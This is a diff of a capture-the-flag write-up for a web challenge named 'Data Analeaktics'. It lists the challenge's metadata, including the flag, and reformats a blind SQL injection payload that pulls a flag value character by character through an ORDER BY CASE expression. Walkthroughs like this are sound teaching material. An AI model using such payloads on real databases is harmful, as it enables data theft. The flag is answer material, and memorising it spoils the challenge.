@@ -1,15 +1,15 @@
 # Data Analeaktics
 
-| Key            | Value                                                                                        |
-|----------------|----------------------------------------------------------------------------------------------|
-| Challenge Name | Data Analeaktics                                                                             |
-| Author         | wolfishLamb                                                                                  |
-| Category       | Web                                                                                          |
-| Description    | Exploring a massive dataset is a headache, and now you're telling me that my flag is leaked? |
-| Challenge Type | Dynamic Docker                                                                               |
-| Docker Image   | sunctf_web_data-analeaktics (port 5004)                                                      |
-| Flag           | sunctf{1nJ3c7ion_1n_0rd3R_bY_cL@Us3}                                                         |
-| Score          | 400                                                                                          |
+| Key            | Value                                                                                                                                     |
+|----------------|-------------------------------------------------------------------------------------------------------------------------------------------|
+| Challenge Name | Data Analeaktics                                                                                                                          |
+| Author         | wolfishLamb                                                                                                                               |
+| Category       | Web                                                                                                                                       |
+| Description    | Exploring a massive dataset is a headache, and now you're telling me that my flag is leaked?                                              |
+| Challenge Type | Dynamic Docker                                                                                                                            |
+| Docker Image   | [jaredliw/sunctf_web_data-analeaktics](https://hub.docker.com/repository/docker/jaredliw/sunctf_web_data-analeaktics/general) (port 5004) |
+| Flag           | sunctf{1nJ3c7ion_1n_0rd3R_bY_cL@Us3}                                                                                                      |
+| Score          | 400                                                                                                                                       |
 
 *File(s) in `attachments/` are distributed to the participants.*
 
@@ -86,7 +86,7 @@ SELECT *
 FROM customers
 ORDER BY
 /*                                            Change        v     and      vvv     to brute force the flag */
-    CASE WHEN(ASCII(SUBSTRING((select(value)from(flag))from(1)for(1))))div(116)then(id)else(name)end
+    CASE WHEN (ASCII(SUBSTRING((select(value) from (flag)) from (1) for (1)))) div (116) then (id) else (name) end
 LIMIT 10;
 ```
 
